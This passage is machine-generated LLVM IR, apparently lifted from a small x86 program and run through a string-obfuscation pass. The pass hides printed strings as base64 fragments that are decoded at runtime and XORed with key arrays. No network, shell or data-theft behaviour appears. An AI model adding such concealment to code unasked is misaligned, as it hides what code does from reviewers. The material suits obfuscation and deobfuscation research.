; Replace: store [16 x i8] c"\34\05\18\6D\35\52\34\47\54\15\14\2E\56\02\42\43", [16 x i8]* %sp0.33
  %sp141 = alloca [16 x i8]
  
;-------------------------------
; Replace: %s0.141 = load [2 x i8], [2 x i8]* @str.0.141
  %cipher.ptr.397 = alloca [5 x i8]
  store [5 x i8] c"\4e\41\55\3d\00", [5 x i8]* %cipher.ptr.397
  %cipher.397 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.397, i32 0, i32 0
  %plain.ptr.397 = tail call i8* @base64_decode(i8* %cipher.397)
  %spi397 = bitcast i8* %plain.ptr.397 to [2 x i8]*
  %s0.141 = load [2 x i8], [2 x i8]* %spi397
;-------------------------------
  %sp0.141 = bitcast [16 x i8]* %sp141 to [2 x i8]*
  store [2 x i8] %s0.141, [2 x i8]* %sp0.141
  %next0.141 = getelementptr [16 x i8], [16 x i8]* %sp141, i32 0, i32 2
  
;-------------------------------
; Replace: %s1.141 = load [2 x i8], [2 x i8]* @str.1.141
  %cipher.ptr.399 = alloca [5 x i8]
  store [5 x i8] c"\47\47\30\3d\00", [5 x i8]* %cipher.ptr.399
  %cipher.399 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.399, i32 0, i32 0
  %plain.ptr.399 = tail call i8* @base64_decode(i8* %cipher.399)
  %spi399 = bitcast i8* %plain.ptr.399 to [2 x i8]*
  %s1.141 = load [2 x i8], [2 x i8]* %spi399
;-------------------------------
  %sp1.141 = bitcast i8* %next0.141 to [2 x i8]*
  store [2 x i8] %s1.141, [2 x i8]* %sp1.141
  %next1.141 = getelementptr [16 x i8], [16 x i8]* %sp141, i32 0, i32 4
  
;-------------------------------
; Replace: %s2.141 = load [2 x i8], [2 x i8]* @str.2.141
  %cipher.ptr.398 = alloca [5 x i8]
  store [5 x i8] c"\4e\56\49\3d\00", [5 x i8]* %cipher.ptr.398
  %cipher.398 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.398, i32 0, i32 0
  %plain.ptr.398 = tail call i8* @base64_decode(i8* %cipher.398)
  %spi398 = bitcast i8* %plain.ptr.398 to [2 x i8]*
  %s2.141 = load [2 x i8], [2 x i8]* %spi398
;-------------------------------
  %sp2.141 = bitcast i8* %next1.141 to [2 x i8]*
  store [2 x i8] %s2.141, [2 x i8]* %sp2.141
  %next2.141 = getelementptr [16 x i8], [16 x i8]* %sp141, i32 0, i32 6
  
;-------------------------------
; Replace: %s3.141 = load [2 x i8], [2 x i8]* @str.3.141
  %cipher.ptr.403 = alloca [5 x i8]
  store [5 x i8] c"\4e\45\63\3d\00", [5 x i8]* %cipher.ptr.403
  %cipher.403 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.403, i32 0, i32 0
  %plain.ptr.403 = tail call i8* @base64_decode(i8* %cipher.403)
  %spi403 = bitcast i8* %plain.ptr.403 to [2 x i8]*
  %s3.141 = load [2 x i8], [2 x i8]* %spi403
;-------------------------------
  %sp3.141 = bitcast i8* %next2.141 to [2 x i8]*
  store [2 x i8] %s3.141, [2 x i8]* %sp3.141
  %next3.141 = getelementptr [16 x i8], [16 x i8]* %sp141, i32 0, i32 8
  
;-------------------------------
; Replace: %s4.141 = load [2 x i8], [2 x i8]* @str.4.141
  %cipher.ptr.401 = alloca [5 x i8]
  store [5 x i8] c"\56\42\55\3d\00", [5 x i8]* %cipher.ptr.401
  %cipher.401 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.401, i32 0, i32 0
  %plain.ptr.401 = tail call i8* @base64_decode(i8* %cipher.401)
  %spi401 = bitcast i8* %plain.ptr.401 to [2 x i8]*
  %s4.141 = load [2 x i8], [2 x i8]* %spi401
;-------------------------------
  %sp4.141 = bitcast i8* %next3.141 to [2 x i8]*
  store [2 x i8] %s4.141, [2 x i8]* %sp4.141
  %next4.141 = getelementptr [16 x i8], [16 x i8]* %sp141, i32 0, i32 10
  
;-------------------------------
; Replace: %s5.141 = load [2 x i8], [2 x i8]* @str.5.141
  %cipher.ptr.396 = alloca [5 x i8]
  store [5 x i8] c"\46\43\34\3d\00", [5 x i8]* %cipher.ptr.396
  %cipher.396 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.396, i32 0, i32 0
  %plain.ptr.396 = tail call i8* @base64_decode(i8* %cipher.396)
  %spi396 = bitcast i8* %plain.ptr.396 to [2 x i8]*
  %s5.141 = load [2 x i8], [2 x i8]* %spi396
;-------------------------------
  %sp5.141 = bitcast i8* %next4.141 to [2 x i8]*
  store [2 x i8] %s5.141, [2 x i8]* %sp5.141
  %next5.141 = getelementptr [16 x i8], [16 x i8]* %sp141, i32 0, i32 12
  
;-------------------------------
; Replace: %s6.141 = load [2 x i8], [2 x i8]* @str.6.141
  %cipher.ptr.402 = alloca [5 x i8]
  store [5 x i8] c"\56\67\49\3d\00", [5 x i8]* %cipher.ptr.402
  %cipher.402 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.402, i32 0, i32 0
  %plain.ptr.402 = tail call i8* @base64_decode(i8* %cipher.402)
  %spi402 = bitcast i8* %plain.ptr.402 to [2 x i8]*
  %s6.141 = load [2 x i8], [2 x i8]* %spi402
;-------------------------------
  %sp6.141 = bitcast i8* %next5.141 to [2 x i8]*
  store [2 x i8] %s6.141, [2 x i8]* %sp6.141
  %next6.141 = getelementptr [16 x i8], [16 x i8]* %sp141, i32 0, i32 14
  
;-------------------------------
; Replace: %s7.141 = load [2 x i8], [2 x i8]* @str.7.141
  %cipher.ptr.400 = alloca [5 x i8]
  store [5 x i8] c"\51\6b\4d\3d\00", [5 x i8]* %cipher.ptr.400
  %cipher.400 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.400, i32 0, i32 0
  %plain.ptr.400 = tail call i8* @base64_decode(i8* %cipher.400)
  %spi400 = bitcast i8* %plain.ptr.400 to [2 x i8]*
  %s7.141 = load [2 x i8], [2 x i8]* %spi400
;-------------------------------
  %sp7.141 = bitcast i8* %next6.141 to [2 x i8]*
  store [2 x i8] %s7.141, [2 x i8]* %sp7.141

  %spi141 = load [16 x i8], [16 x i8]* %sp141
  store [16 x i8] %spi141, [16 x i8]* %sp0.33
;-------------------------------
  %sp0.1.33 = bitcast [16 x i8]* %sp0.33 to i128*
  %i0.33 = load i128, i128* %sp0.1.33

  %sp1.33 = alloca [16 x i8]
;-------------------------------
; Replace: store [16 x i8] c"\7a\6a\6c\4d\51\37\56\32\33\35\79\41\32\67\63\43", [16 x i8]* %sp1.33
  %sp142 = alloca [16 x i8]
  
;-------------------------------
; Replace: %s0.142 = load [2 x i8], [2 x i8]* @str.0.142
  %cipher.ptr.411 = alloca [5 x i8]
  store [5 x i8] c"\65\6d\6f\3d\00", [5 x i8]* %cipher.ptr.411
  %cipher.411 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.411, i32 0, i32 0
  %plain.ptr.411 = tail call i8* @base64_decode(i8* %cipher.411)
  %spi411 = bitcast i8* %plain.ptr.411 to [2 x i8]*
  %s0.142 = load [2 x i8], [2 x i8]* %spi411
;-------------------------------
  %sp0.142 = bitcast [16 x i8]* %sp142 to [2 x i8]*
  store [2 x i8] %s0.142, [2 x i8]* %sp0.142
  %next0.142 = getelementptr [16 x i8], [16 x i8]* %sp142, i32 0, i32 2
  
;-------------------------------
; Replace: %s1.142 = load [2 x i8], [2 x i8]* @str.1.142
  %cipher.ptr.405 = alloca [5 x i8]
  store [5 x i8] c"\62\45\30\3d\00", [5 x i8]* %cipher.ptr.405
  %cipher.405 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.405, i32 0, i32 0
  %plain.ptr.405 = tail call i8* @base64_decode(i8* %cipher.405)
  %spi405 = bitcast i8* %plain.ptr.405 to [2 x i8]*
  %s1.142 = load [2 x i8], [2 x i8]* %spi405
;-------------------------------
  %sp1.142 = bitcast i8* %next0.142 to [2 x i8]*
  store [2 x i8] %s1.142, [2 x i8]* %sp1.142
  %next1.142 = getelementptr [16 x i8], [16 x i8]* %sp142, i32 0, i32 4
  
;-------------------------------
; Replace: %s2.142 = load [2 x i8], [2 x i8]* @str.2.142
  %cipher.ptr.407 = alloca [5 x i8]
  store [5 x i8] c"\55\54\63\3d\00", [5 x i8]* %cipher.ptr.407
  %cipher.407 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.407, i32 0, i32 0
  %plain.ptr.407 = tail call i8* @base64_decode(i8* %cipher.407)
  %spi407 = bitcast i8* %plain.ptr.407 to [2 x i8]*
  %s2.142 = load [2 x i8], [2 x i8]* %spi407
;-------------------------------
  %sp2.142 = bitcast i8* %next1.142 to [2 x i8]*
  store [2 x i8] %s2.142, [2 x i8]* %sp2.142
  %next2.142 = getelementptr [16 x i8], [16 x i8]* %sp142, i32 0, i32 6
  
;-------------------------------
; Replace: %s3.142 = load [2 x i8], [2 x i8]* @str.3.142
  %cipher.ptr.409 = alloca [5 x i8]
  store [5 x i8] c"\56\6a\49\3d\00", [5 x i8]* %cipher.ptr.409
  %cipher.409 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.409, i32 0, i32 0
  %plain.ptr.409 = tail call i8* @base64_decode(i8* %cipher.409)
  %spi409 = bitcast i8* %plain.ptr.409 to [2 x i8]*
  %s3.142 = load [2 x i8], [2 x i8]* %spi409
;-------------------------------
  %sp3.142 = bitcast i8* %next2.142 to [2 x i8]*
  store [2 x i8] %s3.142, [2 x i8]* %sp3.142
  %next3.142 = getelementptr [16 x i8], [16 x i8]* %sp142, i32 0, i32 8
  
;-------------------------------
; Replace: %s4.142 = load [2 x i8], [2 x i8]* @str.4.142
  %cipher.ptr.408 = alloca [5 x i8]
  store [5 x i8] c"\4d\7a\55\3d\00", [5 x i8]* %cipher.ptr.408
  %cipher.408 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.408, i32 0, i32 0
  %plain.ptr.408 = tail call i8* @base64_decode(i8* %cipher.408)
  %spi408 = bitcast i8* %plain.ptr.408 to [2 x i8]*
  %s4.142 = load [2 x i8], [2 x i8]* %spi408
;-------------------------------
  %sp4.142 = bitcast i8* %next3.142 to [2 x i8]*
  store [2 x i8] %s4.142, [2 x i8]* %sp4.142
  %next4.142 = getelementptr [16 x i8], [16 x i8]* %sp142, i32 0, i32 10
  
;-------------------------------
; Replace: %s5.142 = load [2 x i8], [2 x i8]* @str.5.142
  %cipher.ptr.404 = alloca [5 x i8]
  store [5 x i8] c"\65\55\45\3d\00", [5 x i8]* %cipher.ptr.404
  %cipher.404 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.404, i32 0, i32 0
  %plain.ptr.404 = tail call i8* @base64_decode(i8* %cipher.404)
  %spi404 = bitcast i8* %plain.ptr.404 to [2 x i8]*
  %s5.142 = load [2 x i8], [2 x i8]* %spi404
;-------------------------------
  %sp5.142 = bitcast i8* %next4.142 to [2 x i8]*
  store [2 x i8] %s5.142, [2 x i8]* %sp5.142
  %next5.142 = getelementptr [16 x i8], [16 x i8]* %sp142, i32 0, i32 12
  
;-------------------------------
; Replace: %s6.142 = load [2 x i8], [2 x i8]* @str.6.142
  %cipher.ptr.410 = alloca [5 x i8]
  store [5 x i8] c"\4d\6d\63\3d\00", [5 x i8]* %cipher.ptr.410
  %cipher.410 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.410, i32 0, i32 0
  %plain.ptr.410 = tail call i8* @base64_decode(i8* %cipher.410)
  %spi410 = bitcast i8* %plain.ptr.410 to [2 x i8]*
  %s6.142 = load [2 x i8], [2 x i8]* %spi410
;-------------------------------
  %sp6.142 = bitcast i8* %next5.142 to [2 x i8]*
  store [2 x i8] %s6.142, [2 x i8]* %sp6.142
  %next6.142 = getelementptr [16 x i8], [16 x i8]* %sp142, i32 0, i32 14
  
;-------------------------------
; Replace: %s7.142 = load [2 x i8], [2 x i8]* @str.7.142
  %cipher.ptr.406 = alloca [5 x i8]
  store [5 x i8] c"\59\30\4d\3d\00", [5 x i8]* %cipher.ptr.406
  %cipher.406 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.406, i32 0, i32 0
  %plain.ptr.406 = tail call i8* @base64_decode(i8* %cipher.406)
  %spi406 = bitcast i8* %plain.ptr.406 to [2 x i8]*
  %s7.142 = load [2 x i8], [2 x i8]* %spi406
;-------------------------------
  %sp7.142 = bitcast i8* %next6.142 to [2 x i8]*
  store [2 x i8] %s7.142, [2 x i8]* %sp7.142

  %spi142 = load [16 x i8], [16 x i8]* %sp142
  store [16 x i8] %spi142, [16 x i8]* %sp1.33
;-------------------------------
  %sp1.1.33 = bitcast [16 x i8]* %sp1.33 to i128*
  %i1.33 = load i128, i128* %sp1.1.33

  %xp33 = xor i128 %i0.33, %i1.33

  %fi.33 = alloca i128
  store i128 %xp33, i128* %fi.33

  %spi33 = bitcast i128* %fi.33 to [16 x i8]*
  %spi.bis.313 = ptrtoint[16 x i8]* %spi33 to i32
;-------------------------------
  store i32 %spi.bis.313, i32* %10, align 16
  store i32 134517286, i32* %11, align 4
  %arg.i.i1 = load i32, i32* %10, align 16
  %14 = inttoptr i32 %arg.i.i1 to i8*
;-------------------------------
;---Replaced puts with printf---
  %fp81 = tail call i32 (i8*, ...) @printf(i8* nonnull dereferenceable(1) %14)  nobuiltin nounwind "no-builtins" , !funcname !240
;-------------------------------
; Replace: %cast81= getelementptr [1 x i8], [1 x i8]* @.str79, i64 0, i64 0
  %cipher.ptr.216 = alloca [5 x i8]
  store [5 x i8] c"\43\67\3d\3d\00", [5 x i8]* %cipher.ptr.216
  %cipher.216 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.216, i32 0, i32 0
  %plain.ptr.216 = tail call i8* @base64_decode(i8* %cipher.216)
  %spi216 = bitcast i8* %plain.ptr.216 to [1 x i8]*
  %cast81= getelementptr [1 x i8], [1 x i8]* %spi216, i64 0, i64 0
;-------------------------------
  %15 = tail call i32 (i8*, ...) @printf(i8* nonnull dereferenceable(1) %cast81)  nobuiltin nounwind "no-builtins" , !funcname !240
;-------------------------------
  %tmp2_v.i8.i = add i32 %tmp0_v.i2.i, -332
  %16 = inttoptr i32 %tmp2_v.i8.i to i32*
  store i32 300, i32* %16, align 4
;-------------------------------
; Replace: %spi.bis.312 = ptrtoint[21 x i8]* @str.bis.312 to i32
  %sp0.32 = alloca [21 x i8]
;-------------------------------
; Replace: store [21 x i8] c"\03\38\1B\2C\37\09\1E\21\2D\3F\2F\15\15\5E\58\61\57\20\26\7B\7A", [21 x i8]* %sp0.32
  %sp143 = alloca [21 x i8]
  
;-------------------------------
; Replace: %s0.143 = load [2 x i8], [2 x i8]* @str.0.143
  %cipher.ptr.415 = alloca [5 x i8]
  store [5 x i8] c"\41\7a\67\3d\00", [5 x i8]* %cipher.ptr.415
  %cipher.415 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.415, i32 0, i32 0
  %plain.ptr.415 = tail call i8* @base64_decode(i8* %cipher.415)
  %spi415 = bitcast i8* %plain.ptr.415 to [2 x i8]*
  %s0.143 = load [2 x i8], [2 x i8]* %spi415
;-------------------------------
  %sp0.143 = bitcast [21 x i8]* %sp143 to [2 x i8]*
  store [2 x i8] %s0.143, [2 x i8]* %sp0.143
  %next0.143 = getelementptr [21 x i8], [21 x i8]* %sp143, i32 0, i32 2
  
;-------------------------------
; Replace: %s1.143 = load [3 x i8], [3 x i8]* @str.1.143
  %cipher.ptr.417 = alloca [5 x i8]
  store [5 x i8] c"\47\79\77\33\00", [5 x i8]* %cipher.ptr.417
  %cipher.417 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.417, i32 0, i32 0
  %plain.ptr.417 = tail call i8* @base64_decode(i8* %cipher.417)
  %spi417 = bitcast i8* %plain.ptr.417 to [3 x i8]*
  %s1.143 = load [3 x i8], [3 x i8]* %spi417
;-------------------------------
  %sp1.143 = bitcast i8* %next0.143 to [3 x i8]*
  store [3 x i8] %s1.143, [3 x i8]* %sp1.143
  %next1.143 = getelementptr [21 x i8], [21 x i8]* %sp143, i32 0, i32 5
  
;-------------------------------
; Replace: %s2.143 = load [2 x i8], [2 x i8]* @str.2.143
  %cipher.ptr.412 = alloca [5 x i8]
  store [5 x i8] c"\43\52\34\3d\00", [5 x i8]* %cipher.ptr.412
  %cipher.412 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.412, i32 0, i32 0
  %plain.ptr.412 = tail call i8* @base64_decode(i8* %cipher.412)
  %spi412 = bitcast i8* %plain.ptr.412 to [2 x i8]*
  %s2.143 = load [2 x i8], [2 x i8]* %spi412
;-------------------------------
  %sp2.143 = bitcast i8* %next1.143 to [2 x i8]*
  store [2 x i8] %s2.143, [2 x i8]* %sp2.143
  %next2.143 = getelementptr [21 x i8], [21 x i8]* %sp143, i32 0, i32 7
  
;-------------------------------
; Replace: %s3.143 = load [3 x i8], [3 x i8]* @str.3.143
  %cipher.ptr.419 = alloca [5 x i8]
  store [5 x i8] c"\49\53\30\2f\00", [5 x i8]* %cipher.ptr.419
  %cipher.419 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.419, i32 0, i32 0
  %plain.ptr.419 = tail call i8* @base64_decode(i8* %cipher.419)
  %spi419 = bitcast i8* %plain.ptr.419 to [3 x i8]*
  %s3.143 = load [3 x i8], [3 x i8]* %spi419
;-------------------------------
  %sp3.143 = bitcast i8* %next2.143 to [3 x i8]*
  store [3 x i8] %s3.143, [3 x i8]* %sp3.143
  %next3.143 = getelementptr [21 x i8], [21 x i8]* %sp143, i32 0, i32 10
  
;-------------------------------
; Replace: %s4.143 = load [3 x i8], [3 x i8]* @str.4.143
  %cipher.ptr.414 = alloca [5 x i8]
  store [5 x i8] c"\4c\78\55\56\00", [5 x i8]* %cipher.ptr.414
  %cipher.414 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.414, i32 0, i32 0
  %plain.ptr.414 = tail call i8* @base64_decode(i8* %cipher.414)
  %spi414 = bitcast i8* %plain.ptr.414 to [3 x i8]*
  %s4.143 = load [3 x i8], [3 x i8]* %spi414
;-------------------------------
  %sp4.143 = bitcast i8* %next3.143 to [3 x i8]*
  store [3 x i8] %s4.143, [3 x i8]* %sp4.143
  %next4.143 = getelementptr [21 x i8], [21 x i8]* %sp143, i32 0, i32 13
  
;-------------------------------
; Replace: %s5.143 = load [2 x i8], [2 x i8]* @str.5.143
  %cipher.ptr.413 = alloca [5 x i8]
  store [5 x i8] c"\58\6c\67\3d\00", [5 x i8]* %cipher.ptr.413
  %cipher.413 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.413, i32 0, i32 0
  %plain.ptr.413 = tail call i8* @base64_decode(i8* %cipher.413)
  %spi413 = bitcast i8* %plain.ptr.413 to [2 x i8]*
  %s5.143 = load [2 x i8], [2 x i8]* %spi413
;-------------------------------
  %sp5.143 = bitcast i8* %next4.143 to [2 x i8]*
  store [2 x i8] %s5.143, [2 x i8]* %sp5.143
  %next5.143 = getelementptr [21 x i8], [21 x i8]* %sp143, i32 0, i32 15
  
;-------------------------------
; Replace: %s6.143 = load [3 x i8], [3 x i8]* @str.6.143
  %cipher.ptr.416 = alloca [5 x i8]
  store [5 x i8] c"\59\56\63\67\00", [5 x i8]* %cipher.ptr.416
  %cipher.416 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.416, i32 0, i32 0
  %plain.ptr.416 = tail call i8* @base64_decode(i8* %cipher.416)
  %spi416 = bitcast i8* %plain.ptr.416 to [3 x i8]*
  %s6.143 = load [3 x i8], [3 x i8]* %spi416
;-------------------------------
  %sp6.143 = bitcast i8* %next5.143 to [3 x i8]*
  store [3 x i8] %s6.143, [3 x i8]* %sp6.143
  %next6.143 = getelementptr [21 x i8], [21 x i8]* %sp143, i32 0, i32 18
  
;-------------------------------
; Replace: %s7.143 = load [3 x i8], [3 x i8]* @str.7.143
  %cipher.ptr.418 = alloca [5 x i8]
  store [5 x i8] c"\4a\6e\74\36\00", [5 x i8]* %cipher.ptr.418
  %cipher.418 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.418, i32 0, i32 0
  %plain.ptr.418 = tail call i8* @base64_decode(i8* %cipher.418)
  %spi418 = bitcast i8* %plain.ptr.418 to [3 x i8]*
  %s7.143 = load [3 x i8], [3 x i8]* %spi418
;-------------------------------
  %sp7.143 = bitcast i8* %next6.143 to [3 x i8]*
  store [3 x i8] %s7.143, [3 x i8]* %sp7.143

  %spi143 = load [21 x i8], [21 x i8]* %sp143
  store [21 x i8] %spi143, [21 x i8]* %sp0.32
;-------------------------------
  %sp0.1.32 = bitcast [21 x i8]* %sp0.32 to i168*
  %i0.32 = load i168, i168* %sp0.1.32

  %sp1.32 = alloca [21 x i8]
;-------------------------------
; Replace: store [21 x i8] c"\70\51\61\49\58\6f\36\43\58\59\49\70\67\77\62\41\72\4c\53\71\7a", [21 x i8]* %sp1.32
  %sp144 = alloca [21 x i8]
  
;-------------------------------
; Replace: %s0.144 = load [2 x i8], [2 x i8]* @str.0.144
  %cipher.ptr.426 = alloca [5 x i8]
  store [5 x i8] c"\63\46\45\3d\00", [5 x i8]* %cipher.ptr.426
  %cipher.426 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.426, i32 0, i32 0
  %plain.ptr.426 = tail call i8* @base64_decode(i8* %cipher.426)
  %spi426 = bitcast i8* %plain.ptr.426 to [2 x i8]*
  %s0.144 = load [2 x i8], [2 x i8]* %spi426
;-------------------------------
  %sp0.144 = bitcast [21 x i8]* %sp144 to [2 x i8]*
  store [2 x i8] %s0.144, [2 x i8]* %sp0.144
  %next0.144 = getelementptr [21 x i8], [21 x i8]* %sp144, i32 0, i32 2
  
;-------------------------------
; Replace: %s1.144 = load [3 x i8], [3 x i8]* @str.1.144
  %cipher.ptr.427 = alloca [5 x i8]
  store [5 x i8] c"\59\55\6c\59\00", [5 x i8]* %cipher.ptr.427
  %cipher.427 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.427, i32 0, i32 0
  %plain.ptr.427 = tail call i8* @base64_decode(i8* %cipher.427)
  %spi427 = bitcast i8* %plain.ptr.427 to [3 x i8]*
  %s1.144 = load [3 x i8], [3 x i8]* %spi427
;-------------------------------
  %sp1.144 = bitcast i8* %next0.144 to [3 x i8]*
  store [3 x i8] %s1.144, [3 x i8]* %sp1.144
  %next1.144 = getelementptr [21 x i8], [21 x i8]* %sp144, i32 0, i32 5
  
;-------------------------------
; Replace: %s2.144 = load [2 x i8], [2 x i8]* @str.2.144
  %cipher.ptr.422 = alloca [5 x i8]
  store [5 x i8] c"\62\7a\59\3d\00", [5 x i8]* %cipher.ptr.422
  %cipher.422 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.422, i32 0, i32 0
  %plain.ptr.422 = tail call i8* @base64_decode(i8* %cipher.422)
  %spi422 = bitcast i8* %plain.ptr.422 to [2 x i8]*
  %s2.144 = load [2 x i8], [2 x i8]* %spi422
;-------------------------------
  %sp2.144 = bitcast i8* %next1.144 to [2 x i8]*
  store [2 x i8] %s2.144, [2 x i8]* %sp2.144
  %next2.144 = getelementptr [21 x i8], [21 x i8]* %sp144, i32 0, i32 7
  
;-------------------------------
; Replace: %s3.144 = load [3 x i8], [3 x i8]* @str.3.144
  %cipher.ptr.421 = alloca [5 x i8]
  store [5 x i8] c"\51\31\68\5a\00", [5 x i8]* %cipher.ptr.421
  %cipher.421 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.421, i32 0, i32 0
  %plain.ptr.421 = tail call i8* @base64_decode(i8* %cipher.421)
  %spi421 = bitcast i8* %plain.ptr.421 to [3 x i8]*
  %s3.144 = load [3 x i8], [3 x i8]* %spi421
;-------------------------------
  %sp3.144 = bitcast i8* %next2.144 to [3 x i8]*
  store [3 x i8] %s3.144, [3 x i8]* %sp3.144
  %next3.144 = getelementptr [21 x i8], [21 x i8]* %sp144, i32 0, i32 10
  
;-------------------------------
; Replace: %s4.144 = load [3 x i8], [3 x i8]* @str.4.144
  %cipher.ptr.425 = alloca [5 x i8]
  store [5 x i8] c"\53\58\42\6e\00", [5 x i8]* %cipher.ptr.425
  %cipher.425 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.425, i32 0, i32 0
  %plain.ptr.425 = tail call i8* @base64_decode(i8* %cipher.425)
  %spi425 = bitcast i8* %plain.ptr.425 to [3 x i8]*
  %s4.144 = load [3 x i8], [3 x i8]* %spi425
;-------------------------------
  %sp4.144 = bitcast i8* %next3.144 to [3 x i8]*
  store [3 x i8] %s4.144, [3 x i8]* %sp4.144
  %next4.144 = getelementptr [21 x i8], [21 x i8]* %sp144, i32 0, i32 13
  
;-------------------------------
; Replace: %s5.144 = load [2 x i8], [2 x i8]* @str.5.144
  %cipher.ptr.423 = alloca [5 x i8]
  store [5 x i8] c"\64\32\49\3d\00", [5 x i8]* %cipher.ptr.423
  %cipher.423 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.423, i32 0, i32 0
  %plain.ptr.423 = tail call i8* @base64_decode(i8* %cipher.423)
  %spi423 = bitcast i8* %plain.ptr.423 to [2 x i8]*
  %s5.144 = load [2 x i8], [2 x i8]* %spi423
;-------------------------------
  %sp5.144 = bitcast i8* %next4.144 to [2 x i8]*
  store [2 x i8] %s5.144, [2 x i8]* %sp5.144
  %next5.144 = getelementptr [21 x i8], [21 x i8]* %sp144, i32 0, i32 15
  
;-------------------------------
; Replace: %s6.144 = load [3 x i8], [3 x i8]* @str.6.144
  %cipher.ptr.424 = alloca [5 x i8]
  store [5 x i8] c"\51\58\4a\4d\00", [5 x i8]* %cipher.ptr.424
  %cipher.424 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.424, i32 0, i32 0
  %plain.ptr.424 = tail call i8* @base64_decode(i8* %cipher.424)
  %spi424 = bitcast i8* %plain.ptr.424 to [3 x i8]*
  %s6.144 = load [3 x i8], [3 x i8]* %spi424
;-------------------------------
  %sp6.144 = bitcast i8* %next5.144 to [3 x i8]*
  store [3 x i8] %s6.144, [3 x i8]* %sp6.144
  %next6.144 = getelementptr [21 x i8], [21 x i8]* %sp144, i32 0, i32 18
  
;-------------------------------
; Replace: %s7.144 = load [3 x i8], [3 x i8]* @str.7.144
  %cipher.ptr.420 = alloca [5 x i8]
  store [5 x i8] c"\55\33\46\36\00", [5 x i8]* %cipher.ptr.420
  %cipher.420 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.420, i32 0, i32 0
  %plain.ptr.420 = tail call i8* @base64_decode(i8* %cipher.420)
  %spi420 = bitcast i8* %plain.ptr.420 to [3 x i8]*
  %s7.144 = load [3 x i8], [3 x i8]* %spi420
;-------------------------------
  %sp7.144 = bitcast i8* %next6.144 to [3 x i8]*
  store [3 x i8] %s7.144, [3 x i8]* %sp7.144

  %spi144 = load [21 x i8], [21 x i8]* %sp144
  store [21 x i8] %spi144, [21 x i8]* %sp1.32
;-------------------------------
  %sp1.1.32 = bitcast [21 x i8]* %sp1.32 to i168*
  %i1.32 = load i168, i168* %sp1.1.32

  %xp32 = xor i168 %i0.32, %i1.32

  %fi.32 = alloca i168
  store i168 %xp32, i168* %fi.32

  %spi32 = bitcast i168* %fi.32 to [21 x i8]*
  %spi.bis.312 = ptrtoint[21 x i8]* %spi32 to i32
;-------------------------------
  store i32 %spi.bis.312, i32* %10, align 16
  store i32 134517309, i32* %11, align 4
  %17 = tail call x86_fastcallcc i64 @helper_stub_trampoline(i32 inreg noundef %tmp2_v.i1.i, i32 inreg noundef 0, i32 noundef %tmp2_v5.i29.i, i32 noundef ptrtoint (i32 (i8*, ...)* @printf to i32))  nobuiltin nounwind "no-builtins" , !funcname !240
  ret void
}
define internal fastcc void @min_occur_char395(i32 %arg_esp) unnamed_addr  norecurse  !retregs !225 {
.exit:
  %tmp2_v.i1.i = add i32 %arg_esp, 4
  %tmp0_v.i2.i = and i32 %arg_esp, -16
  %0 = inttoptr i32 %arg_esp to i32*
  %1 = load i32, i32* %0, align 4
  %tmp2_v3.i.i = add i32 %tmp0_v.i2.i, -4
  %2 = inttoptr i32 %tmp2_v3.i.i to i32*
  store i32 %1, i32* %2, align 4
  %tmp2_v4.i.i = add i32 %tmp0_v.i2.i, -8
  %3 = inttoptr i32 %tmp2_v4.i.i to i32*
  store i32 0, i32* %3, align 8
  %tmp2_v5.i.i = add i32 %tmp0_v.i2.i, -12
  %4 = inttoptr i32 %tmp2_v5.i.i to i32*
  store i32 %tmp2_v.i1.i, i32* %4, align 4
  %tmp2_v7.i.i = add i32 %tmp0_v.i2.i, -52
  %5 = inttoptr i32 %tmp2_v7.i.i to i32*
  store i32 134517264, i32* %5, align 4
  %tmp4_v.i.i.b = load i1, i1* @segs.0, align 1
  %6 = inttoptr i32 %arg_esp to i32*
  %7 = load i32, i32* %6, align 4
  %tmp2_v2.i8.i = add i32 %tmp0_v.i2.i, -20
  %8 = inttoptr i32 %tmp2_v2.i8.i to i32*
  store i32 %7, i32* %8, align 4
  %tmp2_v3.i9.i = add i32 %tmp0_v.i2.i, -44
  %9 = inttoptr i32 %tmp2_v3.i9.i to i32*
  store i32 1684234849, i32* %9, align 4
  %tmp2_v4.i10.i = add i32 %tmp0_v.i2.i, -40
  %10 = inttoptr i32 %tmp2_v4.i10.i to i32*
  store i32 1751606885, i32* %10, align 8
  %tmp2_v5.i11.i = add i32 %tmp0_v.i2.i, -36
  %11 = inttoptr i32 %tmp2_v5.i11.i to i32*
  store i32 1684234849, i32* %11, align 4
  %tmp2_v6.i.i = add i32 %tmp0_v.i2.i, -32
  %12 = inttoptr i32 %tmp2_v6.i.i to i32*
  store i32 1751606885, i32* %12, align 16
